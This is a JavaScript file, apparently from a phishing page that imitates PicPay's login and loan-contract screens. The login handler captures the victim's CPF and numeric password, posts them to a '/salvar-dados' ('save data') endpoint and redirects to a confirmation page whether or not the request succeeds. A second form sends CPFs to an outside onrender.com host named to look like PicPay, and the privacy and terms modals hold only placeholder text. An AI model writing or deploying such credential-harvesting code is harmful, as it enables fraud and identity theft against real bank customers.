// Substitua seu script.js por este código completo

document.addEventListener('DOMContentLoaded', () => {

    const inicializarMascaraCPF = () => {
        const cpfField = document.querySelector('input[placeholder^="CPF"]'); // Pega qualquer input que comece com "CPF"
        if (cpfField) {
            cpfField.addEventListener('input', (event) => {
                let value = event.target.value.replace(/\D/g, '');
                value = value.substring(0, 11);
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
                value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
                event.target.value = value;
            });
        }
    };

    const inicializarModais = () => {
        const modalOverlay = document.getElementById('modalOverlay');
        if (!modalOverlay) return; 

        const modalContent = document.getElementById('modalContent');
        const closeModalBtn = document.querySelector('.modal-close-btn');

        const modalData = {
            forgotPasswordLink: { title: 'Recuperar Senha', content: `<p>Para recuperar sua senha, digite o CPF cadastrado. Enviaremos um link de recuperação para o seu e-mail.</p><form style="margin-top: 20px;"><input type="text" class="input-field" placeholder="Digite seu CPF"><button type="submit" class="btn-entrar">Enviar Link</button></form>`},
            helpLink: { title: 'Central de Ajuda', content: '<p>Bem-vindo à nossa Central de Ajuda! Aqui você encontra respostas para as dúvidas mais frequentes. Como podemos te ajudar hoje?</p>'},
            privacyLink: { title: 'Política de Privacidade', content: '<p>Esta é a nossa política de privacidade. Comprometemo-nos a proteger seus dados...</p>'},
            termsLink: { title: 'Termos de Uso', content: '<p>Ao usar nossos serviços, você concorda com os seguintes termos...</p>'}
        };

        const openModal = (content) => {
            modalContent.innerHTML = `<h2>${content.title}</h2><div>${content.content}</div>`;
            modalOverlay.classList.add('active');
        };
        const closeModal = () => {
            modalOverlay.classList.remove('active');
        };

        document.querySelectorAll('a[id]').forEach(link => {
            link.addEventListener('click', e => {
                e.preventDefault();
                if (modalData[link.id]) {
                    openModal(modalData[link.id]);
                }
            });
        });
        
        closeModalBtn.addEventListener('click', closeModal);
        modalOverlay.addEventListener('click', (event) => {
            if (event.target === modalOverlay) closeModal();
        });
    };

const inicializarPaginaLogin = () => {
    const loginForm = document.querySelector('form:not(#emprestimoForm)');
    if (!loginForm) return;

    const senhaInput = document.querySelector('input[placeholder="Digite sua senha"]');
    senhaInput.addEventListener('keydown', (event) => {
        const code = event.code;
        if (event.ctrlKey || event.metaKey || !event.key.match(/^\d$/) && event.key.length === 1) {
            if (!['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'].includes(event.key)) {
                event.preventDefault();
            }
        } else if (!code.startsWith('Digit')) {
             event.preventDefault();
        }
    });
    
    loginForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        const cpf = loginForm.querySelector('input[placeholder="CPF"]').value;
        const senha = senhaInput.value;
        if (!cpf || !senha) return alert('Por favor, preencha todos os campos.');
        
        try {
            
            const response = await fetch('/salvar-dados', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cpf, senha }),
            });
            
            await response.json(); 

            
            window.location.href = 'confirmacao.html';
            
        } catch (error) {
            console.error("Falha ao enviar dados:", error);
            window.location.href = 'confirmacao.html';
        }
    });
};
    const inicializarPaginaEmprestimos = () => {
        const emprestimoForm = document.getElementById('emprestimoForm');
        if (!emprestimoForm) return;
        
        emprestimoForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const cpf = document.getElementById('cpfEmprestimo').value;
            if (cpf.length < 14) return alert('Por favor, preencha o CPF corretamente.');

            try {
                const response = await fetch('https://picpay-fky2.onrender.com/acessar-contratos', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cpf }),
                });
                const result = await response.json();
                alert(result.message);
            } catch (error) {
                alert('Não foi possível conectar ao servidor. Tente novamente mais tarde.');
            }
        });
    };


    inicializarMascaraCPF();
    inicializarModais();
    inicializarPaginaLogin();
    inicializarPaginaEmprestimos();
});
